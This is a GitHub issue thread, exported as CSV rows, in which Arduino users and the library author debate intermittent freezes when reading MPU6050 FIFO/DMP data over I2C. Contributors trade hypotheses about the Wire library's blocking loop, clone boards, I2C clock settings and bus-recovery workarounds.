i2cdevlib/jrowberg/252/231805691,"A while ago I had issues with FIFO overruns on a 9150 but I can't remember the details. Switching to FastWire fixed it for me. On 11 Jul 2016 1459, batata004 notifications@friend.com wrote I tried it just right now. If freezed using ""Wire.setClock(400000);"" and also when using ""TWBR = 12;"". Any suggestion? — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub or mute the thread",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/231807958,"Sir, how I switch to fast wire? ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/241637206,"This is not a bug - your loop is taking too long, and the buffer in the IMU is filling up and crashing the I2C bus/processor. That's why removing Serial prints and reducing delays (as you mention in your Arduino forum posts) solves the problem. That's why switching the code to check the FIFO will work. It manifests in many ways. Jeff has written repeatedly in his documentation to check the buffer as often as possible - adding a delay(100) is the opposite of that. In my experience, you need to check the buffer at least every 12ms to long term stability, but the faster the better. You should close this bug report. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/241722023,"@friend you certainly have no idea what you are talking about and you surely should delete your reply to this bug report. Read all the thread, I am not using any delay and I know much better than you how important it is to keep the loop fast. ",True,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/241760891,"Wow. You're really just an angry brat, aren't you? No wonder no one is trying to help you. You're wrong, but I'm not going to show you why. Learn some etiquette On Tue, Aug 23, 2016, 600 AM batata004 notifications@friend.com wrote --  Thanks, Tyler McGahee (619)-880-7779 San Diego, CA **In an effort to be more responsive to email, my emails have become more brief and less formal. Please excuse any impoliteness; it is not intended. ",True,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/252848805,"@friend , any progress on this matter? ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/252907501,"I gave up, this library is too buggy in many aspects and Jeff Rowberg does not care about solving these MANY bugs that you can find with a simple search at Google. Also Jeff does not even read these threads. IMPORTANT DONT USE JEFF'S LIBRARY FOR ANYTHING IMPORTANT. Sooner or later it will fail and if you are using this library with your quadcopter, robotic arm... STAY AWAY OF IT. You will get hurt and hurt other people. There are serious problems with this library which will, sooner or later, cause you intermitent problems. ",True,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/252957517,"@friend, please try to avoid sensationalist language with unsubstantiated claims. Yes, I am reasonably certain that the I2Cdev core and especially some of the device libraries are not bug-free. However, they have worked remarkably well with very few changes for literally thousands of people, some of whom have come back to tell me so after the fact (with complete, stable, working project demos). As noted in my comment from June 28, I2Cdev core code itself does not contain any loops that could lock up the whole system. The Wire library, however, does. This is well-documented and tracked separately. It is not something that I2Cdevlib code can fix, other than switching to a different I2C implementation (which is not a bad idea, but it is outside the scope of this bug report). I still contend that I2Cdev core communication works correctly as long as the hardware is electrically reliable. If the hardware is not electrically reliable, the CPU freeze is because of the Wire library, which has a blocking  loop and no timeout as documented in Arduino issue #1476. I have taken the example code that you posted on June 28 and run it with no modifications in the following setup  Arduino IDE v1.6.11 I2Cdevlib repo pulled from latest Github master branch Official Arduino Uno R3 GY521 breakout board for MPU-6050 AD0 pin tied to Arduino GND VCC pin to Arduino 5V (GY-521 has 3.3v regulator on board) SDA/SCL pins connected to Arduino SDA/SCL correctly Saleae Logic analyzer monitoring SDA and SCL   Your sketch compiles and flashes correctly. The DMP initialization completes without issue, and the YPR output settles within a few seconds to a stable value. I have left it running for 15 minutes with no problems. It has remained totally stable with no freezes, FIFO overflows, or other problems. To test, I pulled out the SCL wire to simulate an electrical issue. This (at least this time) caused the SDA line to get stuck low  The I2Cdev core is not doing this inside its own abstraction code. The GY-521 has 2.2k pull-up resistors on the SDA/SCL lines, so something is driving SDA low during a read operation from the Arduino side. Reconnecting the SCL wire does not resume normal operation, even with all zero data coming back. This suggests that the Wire library got stuck in its blocking  loop while the MPU-6050 sensor is holding SDA low waiting for more clock pulses, which won't come because the Wire library is stuck. (Maybe. I haven't dug into the Wire library's guts.) But the main point here is that it worked perfectly until I broke the hardware on purpose. I will reset the Arduino and let it run for another long while just to confirm this (expected) behavior. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/252966528,"Thanks jeff and I didnt want to offend you. No. I appreciate your help, but I think it would be smart to let people know that your library sometimes crashes. Yes, I executed this same code many times with no problem. But sometimes when I just add some lines of code it gets completely unstable, and after a while it does not generate any other problem. Jeff, I dont have bad wiring, this is not my case. The wires are very well connected to arduino.  I realized this bug happens when you call mpu.getFIFOCount() too many times in small time frame. It almost always freezes at mpu.getFIFOCount() (right when it gets executed). I know that for a fact cause I puted serial.println before and after that function, and it freezes the only the first serial.println. You library may work fine in a moment, in another it just does not work. Adding some lines make the code break sometimes, and other times dont (there is no conflict between your code and those new lines). Jeff, I appreciate your attention and efforts into this library but something is not right. Maybe you are right and it's bad wiring, but in my case it surelly is not. I tested this setup in other arduinos and got similar results. I dont know if you ever heard of SEBRAE here in Brazil. It's an education institution ""for free"", with small fees. I know at least 2 good friends which are teachers of this institution in electronics and also confirmed the problem I was facing. It was them who made me come here and report this. I tried to report this problem in many different foruns and in almost all cases, in the middle of the thread, other people confirmed what I said and had the same problem with different setups. If you think this problem happens of because of some lines of I2C getting LOW, why cant you setup and interrupt in your code to check if the line is LOW for too long and maybe reset the device it that timeout happens? I never used an original arduino, I always used clones, maybe some poor build in those clones cause this problem? Sorry if I disrespected you, you are a nice guy who devoted lots of time to this library however I think, IMHO, that it's not safe using your library in quadcopters, robotic arms... someone could get seriously hurt. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/255254617,"@friend I don't think you are quite getting the point Jeff is making. The problem is not with his library, but with the Arduino Wire library itself that is part of the Arduino IDE. More specifically it is the two-wire interface (TWI) library that the Wire library calls to handle I2C communications. I stumbled upon this discussion looking for an alternative implementation of an I2C library for a unrelated device I am using and can confirm that any device that calls the Wire library will suffer the same issue you are talking about. While loops are used in the TWI library for communication, and as a result, the code can block all other functions on the Arduino while it is waiting infinitely in the TWI while loop. Jeff demonstrated the infinite loop by pulling out the SCL wire from his hardware. Internally, the TWI library provided by Arduino waits for a response from the sensor that is never coming because the physical wire is removed. While your friends at SEBRAE confirmed the behavior, like you they have wrongly assumed it is due to Jeff's code. If you took a different I2C sensor with a library written by a different person (such as the one for the sensor I am using) and pulled a wire, it would behave the exact same way. As for why can't Jeff put an interrupt in his code to check if the line is LOW for too long, the library is blocking anything from happening (Which is why everything stops). The Arduino environment is not a Real-Time Operating System (RTOS). The issue is outside Jeff's code. I hope this clarifies the issue. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/255258214,"@friend you made it very clear, but it still does not explain why reading data from BMP180 using any library around will never hang, never. But as soon as I disconnect BMP180 and connect MPU6050 problems start to happen. It may be a problem in the WIRE implementation, ok! Maybe for some reason MPU6050 has some problem (I already tried at least 5 different modules from 3 different sellers in the last year or so) with the hardware, I dont know. I can only say that this problem only happens with me 1) WHEN using MPU6050 with jeff's library 2) WEN I try to read veery fast data from MPU6050, if I read data once every 100ms, it all works fine 3) in unprecitable times, I cant be sure that it will happen now, but it will certainly happen at some moment Anyway, you were all very clear and made a point. Maybe it's wire.h implementation that is faulty! ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/255276308,"@friend Thanks for your response. I hope that no offence was taken. The issue I am having is actually related to the BME280, a distant relative of the BMP180 sensor, and communications via TCP/IP. My hardware and project is quite different from what you are discussing, and I do not use the MPU6050. From my quick Google search it sounds like the sensor does a lot, and making it work with other I2C hardware is tricky. I wanted to offer some feedback only because I noticed the strong language in your reply to Jeff. I did a quick test with my project, in which the BME280 is the only device communicating via I2C. My microprocessor is an ESP8266 (Which is quite a bit faster than the Uno) and I am using a common industrial protocol over TCP/IP. I have some software that is polling the ESP8266 every second, and I am actively debugging using the serial interface, so there is additional work being done by the system. I pulled one of the wires, and the system kept working. I put the wire back, still no problems. I tried this a couple more times, randomly, and finally the system stopped working. I am only asking for one value via I2C and one value over the industrial communication channel, so I would guess that if I increased the amount of data through the different interfaces, the problem might start to happen more often. Anyways, I hope that you can find a solution to the problem you are having. I thought I would share what I have experienced. Take care! ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/255358604,"@friend  no offence taken ) Glad to know your case, indeed it looks even more a problem with I2C protocol itself than with the jeff's library. What you said is exactly what happens to me, randomly/intermitently problems (as you removed the wired a few times). Anyway, I hope jeff or somebody here with great knowledge in this subject could file a feature request/bug report at Arduino community so they can bring some light to this and solve this problem. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/261958255,"@friend  Hey did you find the solution to the problem ?  I am also facing the same issue, sometimes the library gets stuck at fifo count function . ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/261961562,@friend It's really sad but I got no solution for this problem. It already consumed hundreds of hours trying to work around this but sometimes I think I2C is the guilty but other times I thinks it's jeff's library the problem. It's really an intermitent problem and it's hard to make other people believe I am not doing something stupid - which I am not doing. I wish Jeff could take a look at this serious problem cause many many many other people are facing it on other forum posts and so far no solution. ,False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/261963546,"I have looked into the issue both with and without your supplied code, but have not been able to replicate it without intentionally severing the hardware I2C connection. Any additional troubleshooting will require a logic capture with a Saleae analyzer or similar during a moment when the problem actually occurs on your own platform. But even with this additional detail, I expect the root cause to be outside of any of the I2Cdev code. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/261963758,"@friend  thanks for helping. I dont have a logic analyzer, hope another person with this same problem that owns a logic analyzer can provide details about this problem. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/261968350,"batata004  If you have a jtag emulator. It is the best way of finding issue. Since you are detecting the issue, it is best for you to debug it. •   Just stop the processor at the failure point and see what is wrong. •   Learn from each break point and set more break point to track the problem back to find the root cause. Regards, Pirooz ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/261975756,"@friend I never hard of ""jtag emulator"", sorry I dont have access to one, I will ask a good friend of mine tomorrow to know if he has one and can borrow me for a day. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/261985610,"I helped someone fix the issue with the same setup using the Arduino 101 libraries and fixed the performance issue in the same area that you are having problem. Someone added a fixed delay after wire operation in the readbyte call that was slowing down the I2C accesses. Just remember if you use too many print statement in this area would create new issue or make the issue worse. If you print something, maybe you should print one character and only use one debug statement at a time until you get Jtag emulator. Also remember you have multiple FIFO in the pipe and it may be getting confused dealing with its threshold setting. I2C controller FIFO, Accelerometer FIFO. Do both generate interrupt? If so disable one and use different method of hand shaking. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/262041910,"@friend actually what you are saying is very true! If I dont call too frequently FIFO functions (or retrieve data) this problem does not happen, so your solution to add a delay will certainly help IF, AND ONLY IF, this delay is not too high which could cause the fifo overflow. This ""bug"" relies in the fact that if you request data too fast using I2C something will get wrong at some time and will freeze arduino. And what is really really strange is that sometimes when arduino freezes the watchdog fires, and sometimes not. I use watchdog to turn off my quad if arduino is not working for 500ms but sometimes arduino freezes and watchdog does not even fire. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/262049222,"@friend May be I did not say it correctly. The driver had not needed delay and I removed it to fix the issue. If you have extra delay in the driver, when you call it then you have to wait the same amount of time or more otherwise thing get backed up and creates problem.  It helps if you check status of thing before you write or read so no conflict will happen. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/262477556,"@friend I have similar problems on Arduino nano. Arduino freeze after variable time and it depends on inv_set_fifo_rate.  It run cca 20 minutes when I set 0x04, but it is too slow for me. After reading this thread I started experimenting with TWBR. I use your sketch and now I have 100Hz fifo rate and TWBR 103, sketch is running more than 1 hour without problem. I don't know why, but may be it helps you. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264159320,"Hi all, Well... I use Jeff's library together with the NRF24L01 Radio 2.4GHz transceiver library on an Arduino UNO. The idea is to read data from the MPU6050 and then transmit it for further processing by a nearby computer. My problem with that was that I would, like most of you, see the arduino freeze after some seconds. The chances of getting the problem was somehow correlated with the use of the serial print, but not just that in my case! I work on an university robotic lab, thus I have permission to use multiples arduino boards. One day, trying to debug the problem, I noticed that the code would run normally on some arduino board (not freeze) and not in others. I had those made in Italy and those made in China.. It turns out, only the Italian ones work.  If I upload the same code on the Chinese boards it doesn't work! So, I assume, there must be some hardware incompatibilities issues with the library. In summary, I removed all calls to serial print inside the arduino loop function and use only Italian made boards. In the receiver code (arduino connected to the computer), I use the jeff's library with ros, in order to read the transmitted data from the serial port. It works for me! The only thing now is that I want to receive data at 100Hz, now I receive at about 48Hz. Maybe, the @friend tip on playing with TWBR may also work. Let's see! ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264160484,"Hi @friend I need to get the raw values from the accelerometer normalized  - in the range [0,1], can you please give me some ideas on how to proceed? I saw you post here about the raw values received from the module. Since I am using the default setting in the I2Cdevlib class, would it be correct to just divide the accelerometer x, y, z values by 32767? I appreciate your answer, thanks. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264162520,"Hi, Indeed my boards are chinese or clone ones, I never had the chance to test this problem in a original board. It would be nice if someone could find a chinese board to Jeff so he could test this bug and maybe fix it. @friend  if you want to ""normalize"" a value what you need to do is simple, is map function from arduino, see here  Something like this float x = map(PLACE_YOUR_ACCEL_DATA_HERE,-32768,32768,0,1); Hope it helps. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264182287,"Change TWBR on 103 realy help me, but it's not perfect. Now it's running few hours, but still freeze at the end. It's much better then few minutes or seconds. It all depend on amount of code and amount printed chars between fifo readings and on fifo rate. I have chinese clone too. I spent long time on searching for right value for TWBR. Results of different values are very variable from seconds to minutes. TWBR 103 runs in hours for me, you need another value, may be, you must try. I use 6050 2 years at chinese clones only and all that time I tried find the solution for this problem without succes. I will try buy italien version and test it, but better is find problem with chinese clones. Mr. Rowberg I buy one for you. I don't have skills to debug I2C lib. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264183277,"Indeed @friend I already palyed with TWBR and it produces some different timings on the freeze, low values freezes faster. When I get home I will try 103 but the most time I could run the code without freezing is a few minutes, never got a full hour. Maybe your arduino clone is better than  the ones they sell here in brazil (also from china). ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264185175,@friend I know how things are in Brazil regarding this. Boa sorte! ,False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264185710,"@friend, can you provide a link to an online store/auction (eBay, Aliexpress, etc.) for the same kind of clone that you have? ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264188924,@friend OBRIGADO! ) @friend the clone that I bought is from this seller  this  never bought it from eBay or Aliexpress. ,False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264194046,@ ewerlopes Keep in mind the FCC and Europe regulatory body require different power and transmission duty cycle that may be helping to show the issue more. Looks like we have throughput issue with something getting behind and overflowing a buffer or memory. If you use Jtag emulator. You can stop the MCU at freeze point and see where we are. Then you can breakpoint at the start of that routine and see how you are getting there. The best tools for debugging this type of issue. ,False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264206602,This looks like the same thing  enough for testing? ,False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264212197,"that looks really close, the only difference is that for some reason my arduino's driver is ch340 and this one looks like ch340g, I dont know if this makes any difference. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264215348,I've ordered one of both. The one from China will take a lot longer to get here. ,False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264223369,"Nice! I really hope you get a faulty one and you can check this problem so the community can benefit from your learnings ) Thanks man, I had already given up using your library, now I have high hopes I can come back to use it! ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264811153,I bought original Arduino nano on friday. Same code run till discharge of battery (cca 6hrs) on 100Hz.  @friend you are right. Thank you;) Mr. Rowberg thank's for your patience. I hope you find solution of clone troubles. And thank's for your libraries. ,False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264212617,"Actually this one looks more close to mine -&gt;  cheaper the better cause here in brazil they only sell garbage, so you should probably try to find the shittiest/cheapest arduino and try it out. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264814422,"@friend I am happy to see that the problem is somehow solved! By the way, I tried to modify the TWBR  value but it did not work. I keep receiving data at about 48Hz. However, this sample frequency is not a huge problem to me now. Good luck! ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/264845658,"@friend  TWBR is I2C rate, look here  . If you want change dmp rate, you must change it in library.  Search for this part in 6Axis_Motion and change AxAA to desired value.  It's near line number 300. ♠0x02,   0x16,   0x02,   0x00, AxAA                // D_0_22 inv_set_fifo_rate 0x03 - posledni // This very last 0x01 WAS a 0x09, which drops the FIFO rate down to 20 Hz. 0x07 is 25 Hz, // 0x01 is 100Hz. Going faster than 100Hz (0x00=200Hz) tends to result in very noisy data. // DMP output frequency is calculated easily using this equation (200Hz / (1 + value))`  I tried 200Hz (0x00) and it's run 200Hz and it's independent on TWBR. I change TWBR for better stability of chinese clone only, not for change of DMP speed. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/266059340,"Sorry to be late to the party. I had struggled with what I believe was the same problem; the program would run and then randomly lock up. I have to echo what slesta came up with. In the file ""MPU_6050_6Axis_MotionApps20.h"" down at line 266.  I changed the 0x01 which is 100HZ to 0x02 which is about 66HZ and I get a pretty reliable readout. I have yet to test it on a mobile platform, but it is pretty funny to have it in the car with me and watch it give me yaw information when I turn.  My set up is an Ardunino Nano V3.1 with a Level Translator Breakout - PCA9306 to interface with the MPU.  Yaw drifts about 1 degree every minute and a half or so but for my application this should work. Hope this helps. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/266063382,"@friend to me it does not matter the rate I read the buffer, eventually it will freeze. Could you please confirm that you arduino is original or a clone? You yaw drift I think is expected, you could use a magnetometer to fix that, nothing too complicated. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/281191801,"Hi everyone, is there any progress on this task? I am using the library as well and not only with UNO but also with DUE; which has a more powerful ARM based microcontroller and although everything is fine with the raw values, it crashes after a while of usage in the DMP6 version. What ever TWBR or FIFO rate I tried did not matter, waiting approx 2 min (max) results crash. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/300896412,"Hello people! I stumbled upon this topic while searching for info about MPU6050 latching SDA down. For the record -- I'm having the same latching problem with i.MX6 SoC running Linux. Incidentally, it also always happens getting the FIFO count, as far as I've tested at the moment (but not always on the same byte). Anyway, the reason I'm posting this, is -- given the number of hits in Google -- I have good enough reason to believe this bug is due to MPU6050 chip itself. The variance of when it crashes is highly variable though. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/300899828,"@friend  would you mind telling where did you by you MPU6050? Mine I bought from a good reputation store that is a college for studants learning arduino. I think you are correct, there is some sort of problem with the chip itself that causes this problem BUT the Wire library should be able to handle this right, I think the problem is with WIRE and MPU6050 library, none of them are knowing how to handle some unexpected behaviour (or now ""expected behaviour"" as many reported it) with the chip. Sometimes one of the communication lines dont go back to HIGH or something like that... JEFF'S library and WIRE.H library should know bettter how to handle intermitent connection problems, maybe using timeouts. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/300991367,"@friend Not at all. I bought two units from Drotek -- both exhibit the same behaviour... much to my dismay. No, not really. MPU6050 latching SDA low is a violation of I²C protocol. Thus, this means undefined behaviour for the library. It really is up to you -- as system engineer -- to handle such situations. There is no universal way to unlatch such a chip although a common technique is disabling I²C, sending 9 clock cycles over SCL pin (as a GPIO) and reenabling I²C mode if SDA unlatches. (Or resetting the offending chip, if possible.) Regarding, the situation with Wire -- it would certainly be nice if it could detect a SDA latch condition as it currently just freezes preventing further handling. This is in fact an oft requested feature. Of course, this requires use of a Timer which is a precious resource on an Arduino. Either way, in my humble opinion, the only correct way for Wire to go about it -- if it were to implement timeouts -- return an error, and let the designer handle it. @friend may (or may not) then choose to implement quirky chip handling, but currently his hand are tied. One last note -- please understand that this is not a bug, you've filed a feature request. I also encourage you to try patching the code yourself and share your results (should you choose to). This is an open-source community. Weee! smiley ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/301007232,"@friend I agree with everything you said ) Only one single thing that I not agree it's of course the programmer/engineer responsable for mantaining and keep its code base working. BUT there is a big BUT here arduino freezes when this problem that I reported here happens. How can I try to fix this problem if arduino freezes? The only possible to me try to fix this would be to change the implementatino of Jeff's code and Wire.h. You can imagine that I am not too inside those 2 libraryes, I am not developing a veeery simple head tracking mechanism while I would also have to deeply study WIRE.H and Jeff's library. I think it's in the community's interest that those people able to do that, if they feel happy about that, that they should help. It's not a reasonable argument that I should try to fix the problem, if the owner of the library is having a difficult time trying to solve this problem, who am I to try to solve it? I know this is how open source works, and I love everything about it. But, IMHO, this is indeed a bug. If the library is told to do something AND it does not, it's a bug. You a library gets responsable to provide you ACCEL/GYRO data and it freezes once in a while, it's not a feature request that this freeze stops happening, it's a bug. Nobody comes to a bugtracker and says ""Please, I love your library but sometimes it freezes, would you mind adding a feature request that, if possible, can you please, please, LITTLE PLEASE, stop your library's code from freezing and crashing?"". As I see it's a bug, plain and simple bug. But I am happy we disagree on that, otherwise this community would never get so big and raise so many important discussions if everybody had the same ideas! \o/ ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/311864425,"I have similar situation. My current setup includes a generic MPU6050 (probably a GY-521) and a Dual h-bridge motor driver board and Arduino Pro mini running at 5volts/16mhz. I am using Jeff's library and it works well without the motors running. I am using DMP to get the values from the Gyro. However problems seemed to come when the motors already turned on. At first I tried to eliminate the problem's cause. My first guess is that it's due to the motor's noise that's causing the MPUs erratic behavior or freeze. When running the MPU with the Motors turned on, the longest I can get is about 15 seconds and it seems I am blocked somewhere in an infinite loop. The motors are still running but I could not make it react using the IR sensors and if I pull off the MPU during the run, the functionality of my motors' feedback system resumes.  So I suspect that it's the motor driver that's causing the erratic behavior of the MPU. But here's the interesting thing, when I used the code from here  using Jeff's library), in fact it's also using the Wire.h. I integrated my motor functionalities into the new sketch to see if both MPU and the motor runs, then I was able to make it work it runs indefinitely without MPU readouts freezing. In conclusion to this finding, it's Jeff's library that's causing the problem. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/311954304,@friend really interesting result and it matches what I initially thought jeff's library has a problem. I was induced to believe it was wire.h library fault but that cant be possible cause when I extract data direct from the sensor using only wire.h my arduino never freezes. it only freezes when I use jeff's library to get dmp data (that I cant get using only wire.h). Hope jeff investigate this better. ,False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/311983297,"This is a good data point, but it does not conclusively indicate a problem in I2Cdevlib code. The code from arduino.cc example, for instance, does not use the DMP, so the MPU itself is operating mode without making use of its internal processor. Since this issue has focused on failure case when the DMP is active, that's a significant difference. All comments on this issue referring to raw data access only (no DMP) indicate that the I2Cdevlib code is rock solid. Unless the freezing problem also happens when using I2Cdevlib code for only raw accel/gyro readings, @friend's case does not actually add new information to what we have already seen. Also, the I2Cdevlib code adds some (very) small processing overhead to each I2C transaction since it is another layer of function call abstraction around the core TWI hardware. Given the seemingly random nature of the freeze failures, it is possible that unpredictable small timing differences have an effect on whether the failure case occurs. If this is happening, it still does not necessarily mean that I2Cdevlib code has a defect, but only that I2Cdevlib code increases the probability of conditions necessary for the problem to occur. To get back to the fundamental point here  MPU6050 latching SDA low is a violation of I²C protocol, as @friend pointed out. The Wire library has an internal blocking infinite while loop with no timeout/cancel mechanism. I2Cdevlib code has no blocking infinite while loops itself, and cannot break out of the one in the Wire library..  In other words  The MPU6050 is doing something it shouldn't, and The Wire library does not accommodate this behavior cleanly, and I2Cdevlib cannot fix this without requiring a dedicated hardware timer or else rewriting or replacing the Wire library itself, which is technically possible but outside the current scope of the project and would necessarily compatibility with current and previous Arduino installations.  I am all for clean, bug-free code, but I have yet to identify any potential root cause(s) for this behavior in I2Cdevlib. The true root cause appears to be in the MPU itself, or might be worked around (or at least detected) with a Wire library improvement or kludge like testing  inside the while loop. Detecting and mitigating the problem at the I2Cdevlib layer while still using the Wire library as-is would require a prohibitively complex and resource-intensive addition of timers and interrupts. This type of fix would be more suitably (and just as easily) added to the main application logic rather than the I2Cdevlib code, since 99% of the time it would be irrelevant for other I2Cdevlib users. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/312030808,"@friend you are always very clear and informative. All your conclusions and assumptions are correct (IMHO) but would you mind explaning why when I grab data from the MPU6050 (raw) it never freezes and when I grab using MPU6050 intermitently is freezes? For example, the code below works PERFECTLY. Never freezes, is super reliable and I never never never had any problem when using it. If there was any problem with MPU6050's processor or some timing issue, it would create some intermitent problem when also using the code above. On the other hand, as soon as I use your demo code (the one that extracts data from MPU6050) problems start to happen. I never used your getMotion6 code to check if the problem also happens cause if I have to extract raw data I prefer doing so with the minimum of abstraction as possible, using the pure Wire.h library and notihng else. I really think jeff you could get some cheap MPU6050 from china (clone ones) with also an arduino (my is nano clone) and simulate the problem. I think that if you could see the problem by yourself you would be as frustrated as any other person that finds this problem. I also have to say that MOST people that play around with arudino (I think that most of the people really) are totally beginners and enthusiatics. They will not report any bug or problem, they will think they are doing sometihng stupid and will give up. So I am pretty sure this problem is under reported because people have no idea wha they did wrong AND EVEN IF THEY DIDNT DO ANYTHING WRONG people will always tell those beginners that they are inserting code that takes too long to execute (like delay) and that's the person's fault. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/312037149,"HI @friend, This is exactly the problem that nobody can explain (so far). I don't think this is true. The issue seems to concern the MPU's behavior when the DMP is in use. By all accounts, the fact that it works perfectly when you use native Wire API calls to get raw data but it randomly freezes when using I2Cdevlib code to use the DMP is not because you're using I2Cdevlib code in the failing case, but rather because you are using the DMP in the failing case. I fully expect that if you did test the getMotion6 example with your hardware, it would work fine. Likewise, if you mimic the DMP initialization routine yourself using Wire and not I2Cdevlib, and then read DMP packets from the FIFO also using Wire and not I2Cdevlib, I expect your hardware will fail the same as it is doing now. It may be worth rolling my own I2C/TWI implementation with timeout support, or switching the underlying implementation to something like NBWire. However, I'm not sure it is worth spending a lot of time specifically troubleshooting a case that only appears to occur with clone Arduino or especially clone MPU parts. If the problem originates inside the MPU, then there is no guarantee that we could fix it even if we could detect it and avoid a blocking case. That would, at least, allow triggering an MPU reset instead of just freezing the entire CPU though. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/312069827,"@friend thanks man! Indeed, when DMP is active maybe something weird happens with the module. Maybe it's enabling the DMP that causes the problem in the module. I just dont agree with your argument that this problem ""only"" appears with clones. Recpectfully, I assure you that here in Brazil 90% of people buy clones as for arduino as for mpu6050. Maybe in your country people can afford original ones but here I am pretty sure no more than 10% of people use original/certified hardware. Anyway, I think if more people had time to investigate why their arduinos freezes more people would join me complaining about this problem. And maybe you would be convinced the amount of people that is having to deal with this. I dont know much about how your library works (nor wire.h) but I think using some type of timeout would fix the problem easily. If the DMP does not respond for (example) 100ms, you output some message and keep the user code running. Or maybe you could reset the module and initialize it again if the response is taking too long. I have no idea if this is easy or hard, but if someday you find some spare time I am pretty sure this implementation would save loooots of time of many people! Despite what I said I respect you and you already did an AMAZING library for all the community! I with there were more people that know deep about this and would be willing to help you! ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/312513773,"It's a pity. The library looks really nice, but I can't use it when it's crashing. The combination of hardware I'm using is the GY-521 (chinese clone) and a Teensy 3.1 (no chinese clone). There's an alternate i2c library for the teensy's called i2c_t3. Could that be a solution to this problem? Perhaps the following options could help? I2C_AUTO_RETRY Wire.setDefaultTimeout(timeout); ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/313360275,"@friend the library isn't crashing per se -- it's rather the chip is crashing/misbehaving which the Wire is not made to cope with. The ""i2c_t3"" library you've mentioned looks to me like a Wire replacement for Teensy, which implements timeout and bus recovery (by pushing out 9 dummy clocks) (yes, it's the  you mentioned. As such I find it's entirely feasible to use ""i2cdevlib"" on top of ""i2c_t3"" with perhaps little modifications of the former. @friend to confirm. I cannot say for sure if your MPU6050 will misbehave (you should test it), but you must understand implications if it does. Primarily it means during a ""latchdown event"" you may lose some sample points, or at very least get them late if you're using hardware FIFO. Whether this is a problem to you depends on your application (e.g., a drone will be very sensitive to such hiccups in data). Speaking of unlatching MPU6050 with dummy clocks -- yes it works. Well it worked for me.  of course you will probably want to use shorter timeout than 1 second. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/315451345,"Thanks Johnny, Apparently my hangs were caused by bad connections. Since I fixed them I haven't seen them anymore. When I had them I also saw them with different (non-DMP) MPU code. When I changed that to the t3* library the hangs disappeared but I didn't receive any data either. Now busy with pid-tuning ;-) Rgdz. ",False,True,False,i2cdevlib/jrowberg/252
i2cdevlib/jrowberg/252/349773624,"Got into this issue myself today. The behavior, in this case, is all works well till I disconnect the usb cable from the board. Several seconds later it freezes. If I let it stay for a while starts working again for a few cycles and stops again, this repeats randomly, annoying ",False,True,False,i2cdevlib/jrowberg/252
